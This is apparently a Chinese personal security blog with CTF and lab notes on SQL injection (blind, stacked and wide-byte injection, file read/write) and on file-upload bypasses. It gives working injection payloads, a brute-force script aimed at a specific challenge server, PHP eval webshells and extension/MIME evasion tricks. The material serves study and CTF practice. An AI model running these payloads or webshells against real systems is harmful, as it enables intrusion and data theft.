<p> 检索表： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema&#x3D;&#39;moctf&#39;)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 检索字段： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name&#x3D;&#39;do_y0u_l1ke_long_t4ble_name&#39;)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 读Flag： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 脚本： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#文字转ascii ord()</span><br><span class="line">#ascii转文字 ascii()</span><br><span class="line"></span><br><span class="line">dic &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;119.23.73.3:5004&#x2F;?id&#x3D;2&#39;^&quot;</span><br><span class="line">keyword &#x3D; &quot;Tip&quot;</span><br><span class="line">string &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 300):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;))^&#39;1&#39;&#x3D;&#39;1&quot;.format(str(i),ord(j))</span><br><span class="line">        url_get &#x3D; url + payload</span><br><span class="line">        print(url_get)</span><br><span class="line">        content &#x3D; requests.get(url_get)</span><br><span class="line">        if keyword in content.text:</span><br><span class="line">            string +&#x3D; j</span><br><span class="line">            print(string)</span><br><span class="line">            break</span><br><span class="line">print(&quot;result &#x3D; &quot; + string)</span><br></pre></td></tr></table></figure>

















<h2 id="Insert-amp-Update-注入"><a href="#Insert-amp-Update-注入" class="headerlink" title="Insert&amp;Update 注入"></a>Insert&amp;Update 注入</h2><ul>
<li><strong>闭合括号：</strong><ul>
<li><strong>insert：</strong>可以依次提交如下输入：<code>foo&#39;)-- - foo&#39;,1)-- - foo&#39;,1,1)-- - 等</code> ，直到创建了想要的信息</li>
</ul>
</li>
<li><strong>数据回显：</strong><ul>
<li>构造语句使将查询的内容插入到数据库，然后根据网页上的显示获得数据。</li>
<li>但是MySQL一般不支持，使用+连接字符串，而是使用空格连接字符串。但是空格<strong>无法连接字符串 与 查询命令</strong></li>
<li><strong>思路：</strong>字符串与数字相加，相当于0+数字，就可以将要查询的字符串转换成十六进制，再转换成10进制，然后与字符串相加（即：+0 不变）<ul>
<li><code>insert into stu(id,name) values(1,&#39;test&#39; + conv(hex(user()),16,10) );</code></li>
<li>但是conv() 支持最大的数 <code>0xFFFFFFFFFFFFFFFF</code> 有限制（即最多八个字符），可以用字符串截取函数分段截取。</li>
</ul>
</li>
</ul>
</li>
<li><strong>使用报错：</strong><ul>
<li><code>insert into stu(id,name) values(1,&#39;test&#39; and extravtvalue(xxx));</code></li>
<li>insert into user(username,password) values(‘xxxx’,’ xxxx’),(‘dddd’,’dddd’)/* ‘); </li>
</ul>
</li>
<li><strong>使用延时：</strong><ul>
<li><code>insert into stu(id,name) values(1,&#39;test&#39; and if(xxx,sleep(5),0));</code></li>
</ul>
</li>
</ul>
<h2 id="order-by后的注入"><a href="#order-by后的注入" class="headerlink" title="order by后的注入"></a>order by后的注入</h2><ul>
<li>报错注入：<code>order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</code></li>
<li>bool盲注：<code>order by IF((bool),1,0)</code> 这个比较特殊，并不会按照IF的返回值排序，利用方法时间盲注。另一种：<code>order by IF ((bool) ,1,(select 1 union select 2))</code> bool=false 时，返回后一个结果，但是后一个返回两行数据造成报错，如果为真则不报错。</li>
<li><code>order by rand(true) or rand(false)</code></li>
</ul>
<h2 id="SQL约束注入"><a href="#SQL约束注入" class="headerlink" title="SQL约束注入"></a>SQL约束注入</h2><h2 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h2><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">less-07</span><br><span class="line">my.ini [mysqld] 后面添加secure_file_priv&#x3D;&#39;&#39;</span><br><span class="line">?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;D:\\phpStudy\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\a.txt&quot;--+</span><br><span class="line">?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\test.php&quot;--+</span><br></pre></td></tr></table></figure>



<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162742818.png" alt="image-20200724162742818"></p>
<ul>
<li><code>load_file(绝对路径) select ... into outfile &#39;绝对路径&#39;</code></li>
<li><strong>使用编码：</strong><ul>
<li><code>load_file(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</code></li>
<li><code>load_file(0x433a5c5c544553542e747874)</code></li>
<li><code>select 0x...... into outfile &#39;xxx&#39;</code></li>
<li><code>hex(load_file(path)) 加载二进制数据</code></li>
</ul>
</li>
<li><strong>利用 general_log 写文件(必须是root权限，当outfile被禁时)：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用方向：phpMyAdmin，开启-secure-file-priv选项，禁止执行 outfile，需要知道网站绝对路径</span><br><span class="line">show variables like &#39;%general%&#39;; #查看当前日志位置</span><br><span class="line">set global general_log &#x3D; on; #默认关闭，现在开启</span><br><span class="line">set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;html&#x2F;www&#x2F;xxx.php&#39;; #设置日志存储位置，创建shell文件</span><br><span class="line">select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;; #被保存到shell里</span><br></pre></td></tr></table></figure>

<p>必备条件：</p>
<p>读：file权限必备</p>
<p>写：1.绝对路径 2.union使用 3. 可以使用’’ </p>
<p>————————-读———————-                    </p>
<p>mysql3.x读取方法</p>
<p>create table a(cmd text);</p>
<p>load data infile ‘c:\xxx\xxx\xxx.txt’ into table a;</p>
<p>select * from a;</p>
<p>mysql4.x读取方法</p>
<p>除上述方法还可以使用load_file()</p>
<p>create table a(cmd text);</p>
<p>insert into a(cmd) values(load_file(‘c:\ddd\ddd\ddd.txt’));</p>
<p>select * from a;</p>
<p>mysql5.x读取方法</p>
<p>上述两种都可以</p>
<p>读取文件技巧：</p>
<p>load_file(char(32,26,56,66))</p>
<p>load_file(0x633A5C626F6F742E696E69)</p>
<p>————写————————–</p>
<p>into outfile写文件</p>
<p>union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*</p>
<p>union select 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
<p>不像寻常的sql注入一样要用到select where   绕waf方式:用16进制编码</p>
<p>1’;show databases;#       <del>1’;show database()#</del> </p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725221517562.png" alt="image-20200725221517562"></p>
<p>1’;show tables;#   只能看当前的表 我也不知道当前的表是ctftraining还是supersqli还是test  最后确认当前表是supersqli  error 1146 : Table ‘supersqli.words’ doesn’t exist</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725221606747.png" alt="image-20200725221606747"></p>
<p>1’;show columns from <code>1919810931114514</code>;#        <del>1’;show columns from  1919810931114514;#</del> 要用反引号括起来  一个数字字符串用作表名的时候要用反引号包裹</p>
<p>用于重命名表的alter 和 rename 没有被过滤</p>
<p>words表是默认表 重命名1919810931114514表为words</p>
<p><del>1’;alter table words  rename to  words1;#</del></p>
<p><del>1’;alter table <code>1919810931114514</code>  rename to words;#</del>   不能分两次执行只能一次 </p>
<p>1’;alter table words  rename to  words1;alter table <code>1919810931114514</code>  rename to words;alter table words change flag  id varchar(50);#     varchar(50)为原来flag字段的类型</p>
<p>1’or 1=1# 用万能钥匙来得到flag 一开始万能密码查到的也是words表下面的字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less-38</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;insert into users(id,username,password) values(17,&#39;test7&#39;,&#39;007&#39;)--+</span><br></pre></td></tr></table></figure>



<blockquote>
<p>限制条件：必须支持堆叠查询才行</p>
<p>可以插入管理员账号等</p>
<p>PHP中的：<code>multi_query</code> 可以堆叠查询 </p>
</blockquote>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162734076.png" alt="image-20200724162734076"></p>
<p><strong>使用预处理语句绕过过滤：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set @sql&#x3D;0x...................; 0x....是经过十六进制编码的SQL语句</span><br><span class="line">prepare @sql; excute @sql; 准备和执行</span><br><span class="line"></span><br><span class="line">1&#39;;set @a&#x3D;select * from &#96;1919810931114514&#96;;#    select * from &#96;1919810931114514&#96;这句话千万™不要写错了</span><br><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a; excute execsql;#</span><br><span class="line">返回：strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)  要用大小写来绕过  strstr可以用大小写来绕过</span><br><span class="line">1&#39;;SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a; execute execsql;#   可以执行成功</span><br><span class="line">or</span><br><span class="line">1&#39;;SeT @sql&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare @sql; execute @sql;#   不行 估计格式不对</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726093411245.png" alt="image-20200726093411245"></p>
<p>​              <img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726093636222.png" alt="image-20200726093636222"> </p>
<p>进阶一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%23</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x666c6167%23</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1%df%27%20union%20select%201,group_concat(flag)%20from%20flag%23</span><br></pre></td></tr></table></figure>





<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Less-32</span><br><span class="line">?id=-1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------爆表名</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span>%df<span class="string">'union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=0x656d61696c73--+</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------爆列名</span></span><br><span class="line"><span class="string">?id=-1%df'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">group_concat</span>(email_id) <span class="keyword">from</span> security.emails<span class="comment">--+</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------爆数据</span></span><br></pre></td></tr></table></figure>



<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162715417.png" alt></p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162721889.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用%df来吃掉 </span><br><span class="line">对‘进行转义后为\&#39;  $id &#x3D; addslashes($id);</span><br><span class="line">多出的反斜杠</span><br></pre></td></tr></table></figure>







<h2 id="关于mysql"><a href="#关于mysql" class="headerlink" title="关于mysql:"></a>关于mysql:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service mysql start</span><br><span class="line">mysqladmin -u root password 123456</span><br><span class="line">mysql -u root -p </span><br><span class="line">show databases;                        </span><br><span class="line">create database db;</span><br><span class="line">use mysql;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-23 21:34:54" itemprop="dateCreated datePublished" datetime="2019-11-23T21:34:54+08:00">2019-11-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-29 22:34:54" itemprop="dateModified" datetime="2020-12-29T22:34:54+08:00">2020-12-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"zhiliya"</span>]);<span class="meta">?&gt;</span></span><br><span class="line">上传成功后 在返回的html页面中找到上传后的路径 然后访问该路径下的木马 看看能不能被当做php文件解析 然后蚁剑连之</span><br><span class="line">蚁剑连接返回<span class="number">404</span>则表明该文件不存在或文件路径不存在  返回数据为空则表明能文件路径和文件存在但并未被解析</span><br><span class="line">gif png都能解析 唯独jpg不行</span><br><span class="line">若上传</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>])&lt;/script&gt;</span><br><span class="line">能显示phpinfo页面</span><br><span class="line">但连不上蚁剑</span><br></pre></td></tr></table></figure>

<p>![image-20200729212058088](5 文件上传/image-20200729212058088.png)</p>
<p>![image-20200729212228189](5 文件上传/image-20200729212228189.png)</p>
<p>![image-20200729213223227](5 文件上传/image-20200729213223227.png)</p>
<p>换菜刀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写后门</span><br><span class="line">?file=php:<span class="comment">//input     <span class="meta">&lt;?</span>fputs(fopen("shell.php","w"),"<span class="meta">&lt;?php</span> eval($_post['xxx'];<span class="meta">?&gt;</span>")<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'1.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST["bu1"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>![11525934-e19630249b9b8764](5 文件上传/11525934-e19630249b9b8764.png)</p>
<h1 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h1><ul>
<li><p>直接在前端页面改</p>
</li>
<li><p>改成jpg后缀绕过前端js代码检测限制 然后用burp改jpg后缀为php  </p>
<p>改回php还是为了能够解析上传的文件 不然一个jpg文件上传也不能以php文件解析 没用啊</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">----------------------------<span class="number">-145951556421633</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"upload_file"</span>; filename=<span class="string">"1.png"</span>    先将php文件后缀改为允许的格式            改为php解析</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"zhiliya"</span>]);<span class="meta">?&gt;</span></span><br><span class="line">----------------------------<span class="number">-145951556421633</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"submit"</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">----------------------------<span class="number">-145951556421633</span>--</span><br></pre></td></tr></table></figure>

<h1 id="服务端检测绕过-MIME-类型检测"><a href="#服务端检测绕过-MIME-类型检测" class="headerlink" title="服务端检测绕过(MIME 类型检测)"></a>服务端检测绕过(MIME 类型检测)</h1><p><strong>conten-type文 件 类</strong>：Content-Type: image/jpeg      image/gif         image/png</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt;</p>
<h1 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        </span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);<span class="comment">//黑名单  第一个</span></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);  <span class="comment">//首尾去空格</span></span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点  文件名末尾加点  windows特性</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写  </span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA  windows特性</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空  windows特性</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">黑名单禁用了asp aspx php jsp   </span><br><span class="line"></span><br><span class="line">用这些后缀绕过：.phtml .php3 .php4 .php5     .pht .phps    .phtm    .php1 .php2    .html .htm     (容易失败)</span><br><span class="line">前提：appache配置里要加入AddType application/x-httpd-php .phtml .php3 .php4 .php5 .pht .phps .phtm .php1 .php2 .html .htm</span><br><span class="line">   表示这些后缀名的文件都会被当成php解析</span><br><span class="line"></span><br><span class="line">大小写：.pHp|   .pHp5|.pHp4|.pHp3|.pHp2|pHp1| .Html|.Htm|    .pHtml</span><br></pre></td></tr></table></figure>

<h3 id="大小写绕过-使用文件包含利用"><a href="#大小写绕过-使用文件包含利用" class="headerlink" title="大小写绕过 使用文件包含利用"></a>大小写绕过 使用文件包含利用</h3><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p>
<p><a href="http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php</a> 使用文件包含利用</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215220752679.png" alt="image-20191215220752679"></p>
<h3 id="后缀名中加空格绕过-windows特性-可以"><a href="#后缀名中加空格绕过-windows特性-可以" class="headerlink" title="后缀名中加空格绕过  windows特性  可以"></a>后缀名中加空格绕过  windows特性  可以</h3><p><code>$file_ext = trim($file_ext); //首尾去空</code></p>
<p>利用windows特性，会自动去掉后缀名中最后的” ”，可在后缀名中加” ”绕过：</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215221236285.png" alt="image-20191215221236285"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094455676.png" alt="image-20191216094455676"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094610261.png" alt="image-20191216094610261"></p>
<h3 id="加”-”绕过-windows特性"><a href="#加”-”绕过-windows特性" class="headerlink" title="加”.”绕过 windows特性"></a>加”.”绕过 windows特性</h3><p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<p>利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：</p>
